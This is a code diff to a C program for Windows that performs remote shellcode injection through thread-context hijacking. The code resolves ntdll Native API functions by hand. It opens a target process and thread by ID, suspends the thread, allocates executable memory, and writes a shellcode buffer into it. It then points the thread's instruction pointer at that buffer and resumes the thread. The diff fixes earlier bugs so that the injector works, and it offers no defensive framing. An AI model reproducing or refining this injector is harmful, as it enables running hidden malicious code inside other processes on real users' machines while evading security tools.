@@ -9,6 +9,9 @@
 #define STATUS_SUCCESS 0x00000000
 #define TH32CS_SNAPPROCESS 0x00000002
 #define TH32CS_SNAPTHREAD
+
+#define CREATE_NO_WINDOW 0x08000000
+
 //#define PAGE_READWRITE 0x04
 //#define MEM_COMMIT 0x00001000
 //#define MEM_RESERVE 0x00002000
@@ -138,36 +141,34 @@ size_t GetFuncAddr(size_t modb, char* fn) {
 }
 
 
-void statchecker(NTSTATUS check){
-
-	if(check == STATUS_SUCCESS){
-
-		g("status success");
-	}
-
-}
 
 
 
 
-int main() {
+
+
+int main(int argc, char* argv[]) {
+
+	int pid = atoi(argv[1]);
+	DWORD procid = (DWORD)pid;
+	int tid = atoi(argv[2]);
+	DWORD thid = (DWORD)tid;
 	size_t kb = GetModHandle(L"C:\\WINDOWS\\System32\\ntdll.dll");
+	
+	//ze_t mb = GetModHandle(L"C:\\WINDOWS\\System32\\kernel32.dll");
 
-	g(" GetModHandle(ntdll.dll) = %p\n", kb);
-
-	size_t mb = GetModHandle(L"C:\\WINDOWS\\System32\\ntdll.dll");
-
-	size_t ptr_CreateProcessA = (size_t)GetFuncAddr(mb, "CreateProcessA");
-	size_t ptr_CreateToolhelp32Snapshot = (size_t)GetFuncAddr(mb, "CreateToolhelp32Snapshot");
-	size_t ptr_Process32First = (size_t)GetFuncAddr(mb, "Process32First");
-	size_t ptr_Process32Next = (size_t)GetFuncAddr(mb, "Process32Next");
-	size_t ptr_CloseHandle = (size_t)GetFuncAddr(mb, "CloseHandle");
+	//size_t ptr_CreateProcessW = (size_t)GetFuncAddr(mb, "CreateProcessW");
+	//size_t ptr_CreateToolhelp32Snapshot = (size_t)GetFuncAddr(mb, "CreateToolhelp32Snapshot");
+	//size_t ptr_Process32First = (size_t)GetFuncAddr(mb, "Process32First");
+	//size_t ptr_Process32Next = (size_t)GetFuncAddr(mb, "Process32Next");
+	//size_t ptr_CloseHandle = (size_t)GetFuncAddr(mb, "CloseHandle");
 
 
 	size_t ptr_NtOpenThread = (size_t)GetFuncAddr(kb,"NtOpenThread");
-	size_t ptr_NtSuspendThread = (size_t)GetFuncAddr(kb,"NtOpenThread");
-	size_t ptr_NtGetContextThread = (size_t)GetFuncAddr(kb,"NtOpenThread");
-	size_t ptr_NtAllocateVirtualMemory = (size_t)GetFuncAddr(kb,"NtOpenThread");
+	size_t ptr_NtOpenProcess = (size_t)GetFuncAddr(kb, "NtOpenProcess");
+	size_t ptr_NtSuspendThread = (size_t)GetFuncAddr(kb,"NtSuspendThread");
+	size_t ptr_NtGetContextThread = (size_t)GetFuncAddr(kb,"NtGetContextThread");
+	size_t ptr_NtAllocateVirtualMemory = (size_t)GetFuncAddr(kb,"NtAllocateVirtualMemory");
 	size_t ptr_NtWriteVirtualMemory = (size_t)GetFuncAddr(kb,"NtWriteVirtualMemory");
 	size_t ptr_NtSetContextThread = (size_t)GetFuncAddr(kb, "NtSetContextThread");
 	size_t ptr_NtResumeThread = (size_t)GetFuncAddr(kb, "NtResumeThread");
@@ -175,56 +176,78 @@ int main() {
 
 
 	NTSTATUS status;
-	STARTUPINFO si;
-	HANDLE hThread;
-	HANDLE hProc;
-	OBJECT_ATTRIBUTES oa;
-	DWORD pid;
+
+	STARTUPINFOW si = { .cb = sizeof(STARTUPINFOW) };
+	CLIENT_ID cid = { (HANDLE)procid, (HANDLE)thid };
+
+	i("target pid: %d", procid);
+	i("CLIENT_ID: %p, %p", cid.UniqueProcess, cid.UniqueThread);
+
+	OBJECT_ATTRIBUTES oa = { 0 };
+	oa.Length = sizeof(OBJECT_ATTRIBUTES);
+	
+	
 	PVOID baseAddress = NULL;
-	ULONG n;
 	PROCESS_INFORMATION pi;
-	PCONTEXT CTX;
-	PROCESSENTRY32 dw;
-	dw.dwSize = sizeof(dw);
-	PSIZE_T usize;
+	CONTEXT CTX = { .ContextFlags = (CONTEXT_CONTROL | CONTEXT_SEGMENTS | CONTEXT_INTEGER) };
+	
+	
+	
 
-	BOOL proc =((BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))ptr_CreateProcessA)("C:\\Windows\\System32\\notepad.exe",NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi );
-	if (proc == FALSE){
-		e(" create process failed");
+	//BOOL proc = ((BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))ptr_CreateProcessW)(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);	
+	
+	
 
+	
+	SIZE_T sz = sizeof(buf);
+	g("size of shellcode: %d", sz);
+
+	HANDLE hProc;
+	HANDLE hThread;
+
+	
+	
+	status = ((NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))ptr_NtOpenProcess)(&hProc, PROCESS_ALL_ACCESS, &oa, &cid);
+
+	if (status == STATUS_SUCCESS) { g("proc opened"); }
+	else { e("proc not open, 0x%08X", status); return 1; }
+
+
+	status = ((NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))ptr_NtOpenThread)(&hThread, THREAD_ALL_ACCESS, &oa , &cid);
+	
+	if (status == STATUS_SUCCESS) { g("thread opened"); }
+	else { e("thread not open, 0x%08X", status); return 1; }
+
+	status = ((NTSTATUS(NTAPI*)(HANDLE, PULONG))ptr_NtSuspendThread)(hThread, NULL);
+
+	if (status == STATUS_SUCCESS) { g("thread suspended"); }
+	else { e("thread not sus, 0x%08X", status); return 1; }
+
+	status = ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtGetContextThread)(hThread, &CTX);
+
+	if (status == STATUS_SUCCESS) { g("got ctx thread at: %p", CTX); }
+	else { e("did not get ctx thread, 0x%08X", status); return 1; }
+
+	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(hProc, &baseAddress, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	
+	if (status == STATUS_SUCCESS){ g("allocated memory at: %p", baseAddress); }
+		else { e("failed to allocate memory, 0x%08X", status); return 1; }
+		
+
+	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))ptr_NtWriteVirtualMemory)(hProc, baseAddress, buf, sizeof(buf), NULL);
+	if (status == STATUS_SUCCESS) { g("wrote memory, 0x%08X", status);
 	}
-	//HANDLE snap = ((HANDLE(WINAPI*)(DWORD, DWORD))ptr_CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
+	else { e("did not write, %08X", status);; return 1; }
 
-	//if(((BOOL(WINAPI*)(HANDLE, LPROCESSENTRY32))ptr_Process32First)(snap, &dw)==TRUE){
-	//	while  (((BOOL(WINAPI*)(HANDLE, LPROCESSENTRY32))ptr_Process32Next)(snap, &dw) == TRUE){
+	CTX.Rip = (DWORD64)baseAddress;
 
-	//	if (stricmp(dw.szExeFile, "notepad.exe")== 0){
-	//		pid == dw.th32ProcessID;
-	//	}
-	//}
-	//}
-
-	//((BOOL(WINAPI*)(HANDLE))ptr_CloseHandle)(snap);
-
-	ULONG sz = sizeof(buf);
-	hProc = pi.hProcess;
-	hThread = pi.hThread;
-
-	status = ((NTSTATUS(NTAPI*)(HANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG))ptr_NtOpenThread)(hThread, THREAD_ALL_ACCESS, &oa ,0);
-	statchecker(status);
-
-	status = ((NTSTATUS(NTAPI*)(HANDLE, PULONG))ptr_NtSuspendThread)(hThread, &n);
-
-	status = ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtGetContextThread)(hThread, CTX);
-
-	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG))ptr_NtAllocateVirtualMemory)(hThread, &buf, n, usize,MEM_COMMIT |  MEM_RESERVE ,PAGE_READWRITE);
-
-	status = ((NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))ptr_NtWriteVirtualMemory)(hThread, NULL, &buf, sizeof(buf), NULL);
-
-	status = ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtSetContextThread)(hThread, CTX);
+	status = ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtSetContextThread)(hThread, &CTX);
+	if (status == STATUS_SUCCESS) { g("set thread ctxy"); }
+	else { e("did not set , 0x%08X", status); return 1; }
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PULONG))ptr_NtResumeThread)(hThread, NULL);
-
+	if (status == STATUS_SUCCESS) { g("resumed"); }
+	else { e("did not resume, 0x%08X", status); return 1; }
 
 
 	return 0;
